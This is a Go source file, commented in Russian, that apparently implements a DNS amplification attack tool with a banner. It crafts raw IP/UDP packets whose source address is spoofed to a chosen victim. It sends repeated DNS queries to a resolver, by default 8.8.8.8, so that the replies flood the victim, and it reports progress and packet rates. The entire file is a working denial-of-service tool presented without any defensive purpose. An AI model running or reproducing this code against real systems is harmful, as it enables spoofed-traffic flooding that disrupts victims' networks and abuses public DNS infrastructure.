package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Config хранит конфигурацию атаки
type Config struct {
	targetIP  string
	dnsServer string
	domain    string
	count     int
	srcPort   int
	delay     time.Duration
}

func main() {
	// Компактный баннер
	banner := `
    ╔═══════════════════════════╗
    ║   ┏━┓╻ ╻╺┓ ┏━┓┏━╸┏━┓╺┓ 	║	
	║	┗━┓┃╻┃ ┃ ┏━┛┣╸ ┏━┛ ┃ 	║
	║	┗━┛┗┻┛╺┻╸┗━╸╹  ┗━╸╺┻╸   ║
    ║     DNS Amplification     ║
    ╚═══════════════════════════╝
    `
	fmt.Println(banner)

	cfg := parseFlags()

	fmt.Printf("Starting DNS amplification attack:\n")
	fmt.Printf("Target IP: %s\n", cfg.targetIP)
	fmt.Printf("DNS Server: %s\n", cfg.dnsServer)
	fmt.Printf("Domain: %s\n", cfg.domain)
	fmt.Printf("Source Port: %d\n", cfg.srcPort)
	fmt.Printf("Packets: %d\n", cfg.count)
	fmt.Printf("Delay: %v\n\n", cfg.delay)

	// Создаем RAW-сокет
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatalf("Failed to create raw socket (need root privileges): %v", err)
	}
	defer syscall.Close(fd)

	// Парсим DNS сервер (IP:port)
	dnsIP, dnsPort := parseDNSServer(cfg.dnsServer)

	addr := syscall.SockaddrInet4{
		Port: dnsPort,
		Addr: ipToArray(dnsIP),
	}

	// Формируем DNS-запрос
	dnsQuery := createDNSQuery(cfg.domain)

	// Формируем UDP-заголовок
	udpHeader := createUDPHeader(cfg.srcPort, dnsPort, 8+len(dnsQuery))

	// Формируем псевдо-заголовок для UDP контрольной суммы
	udpPacket := append(udpHeader, dnsQuery...)

	// Формируем IP-заголовок
	ipHeader := createIPHeader(cfg.targetIP, dnsIP.String(), len(udpPacket))

	// Собираем полный пакет
	fullPacket := append(ipHeader, udpPacket...)

	// Отправляем пакеты
	successCount := 0
	startTime := time.Now()

	for i := 0; i < cfg.count; i++ {
		err := syscall.Sendto(fd, fullPacket, 0, &addr)
		if err != nil {
			log.Printf("Failed to send packet %d: %v", i, err)
		} else {
			successCount++
			if i%10 == 0 { // Обновляем прогресс каждые 10 пакетов
				fmt.Printf("Progress: %d/%d packets sent\r", i+1, cfg.count)
			}
		}
		time.Sleep(cfg.delay)
	}

	duration := time.Since(startTime)
	fmt.Printf("\n" + strings.Repeat("-", 50) + "\n")
	fmt.Printf("Attack completed!\n")
	fmt.Printf("Successfully sent: %d/%d packets\n", successCount, cfg.count)
	fmt.Printf("Duration: %v\n", duration)
	fmt.Printf("Rate: %.2f packets/second\n", float64(successCount)/duration.Seconds())
}

// parseFlags парсит аргументы командной строки
func parseFlags() *Config {
	cfg := &Config{}

	// Определяем флаги со значениями по умолчанию
	flag.StringVar(&cfg.targetIP, "target", "192.168.1.100", "Target IP address to spoof")
	flag.StringVar(&cfg.dnsServer, "dns", "8.8.8.8:53", "DNS server (IP:port)")
	flag.StringVar(&cfg.domain, "domain", "example.com", "Domain name to query")
	flag.IntVar(&cfg.count, "count", 100, "Number of packets to send")
	flag.IntVar(&cfg.srcPort, "port", 12345, "Source port for UDP packets")
	delay := flag.Int("delay", 100, "Delay between packets in milliseconds")

	// Парсим флаги
	flag.Parse()

	// Конвертируем задержку в time.Duration
	cfg.delay = time.Duration(*delay) * time.Millisecond

	// Валидация
	if net.ParseIP(cfg.targetIP) == nil {
		log.Fatalf("Invalid target IP: %s", cfg.targetIP)
	}

	return cfg
}

// parseDNSServer парсит строку DNS сервера в IP и порт
func parseDNSServer(server string) (net.IP, int) {
	parts := strings.Split(server, ":")
	ip := net.ParseIP(parts[0])
	if ip == nil {
		log.Fatalf("Invalid DNS server IP: %s", parts[0])
	}

	port := 53 // порт по умолчанию
	if len(parts) > 1 {
		p, err := strconv.Atoi(parts[1])
		if err != nil {
			log.Fatalf("Invalid DNS server port: %s", parts[1])
		}
		port = p
	}

	return ip.To4(), port
}

// Преобразование IP в массив [4]byte
func ipToArray(ip net.IP) [4]byte {
	var ipArray [4]byte
	copy(ipArray[:], ip.To4())
	return ipArray
}

// Создание IP-заголовка
func createIPHeader(srcIP, dstIP string, dataLen int) []byte {
	header := make([]byte, 20)

	header[0] = 0x45
	header[1] = 0x00
	binary.BigEndian.PutUint16(header[2:4], uint16(20+dataLen))
	binary.BigEndian.PutUint16(header[4:6], uint16(0x1234))
	binary.BigEndian.PutUint16(header[6:8], 0x0000)
	header[8] = 64
	header[9] = 17
	binary.BigEndian.PutUint16(header[10:12], 0)
	copy(header[12:16], net.ParseIP(srcIP).To4())
	copy(header[16:20], net.ParseIP(dstIP).To4())

	checksum := calculateChecksum(header)
	binary.BigEndian.PutUint16(header[10:12], checksum)

	return header
}

// Создание UDP-заголовка
func createUDPHeader(srcPort, dstPort, length int) []byte {
	header := make([]byte, 8)
	binary.BigEndian.PutUint16(header[0:2], uint16(srcPort))
	binary.BigEndian.PutUint16(header[2:4], uint16(dstPort))
	binary.BigEndian.PutUint16(header[4:6], uint16(length))
	binary.BigEndian.PutUint16(header[6:8], 0)
	return header
}

// Создание DNS-запроса
func createDNSQuery(domain string) []byte {
	query := make([]byte, 12+len(domain)+5)

	query[0] = 0xAA
	query[1] = 0xBB
	query[2] = 0x01
	query[3] = 0x00
	query[4] = 0x00
	query[5] = 0x01

	for i := 6; i < 12; i++ {
		query[i] = 0x00
	}

	offset := 12
	parts := splitDomain(domain)
	for _, part := range parts {
		query[offset] = byte(len(part))
		offset++
		copy(query[offset:], part)
		offset += len(part)
	}
	query[offset] = 0x00
	offset++

	query[offset] = 0x00
	query[offset+1] = 0x01
	query[offset+2] = 0x00
	query[offset+3] = 0x01

	return query
}

// Разделение домена на части
func splitDomain(domain string) [][]byte {
	var parts [][]byte
	start := 0
	for i, ch := range domain {
		if ch == '.' {
			parts = append(parts, []byte(domain[start:i]))
			start = i + 1
		}
	}
	parts = append(parts, []byte(domain[start:]))
	return parts
}

// Расчет контрольной суммы IP-заголовка
func calculateChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data); i += 2 {
		var word uint16
		if i+1 < len(data) {
			word = binary.BigEndian.Uint16(data[i : i+2])
		} else {
			word = uint16(data[i]) << 8
		}
		sum += uint32(word)
	}

	for sum>>16 > 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}

	return ^uint16(sum)
}
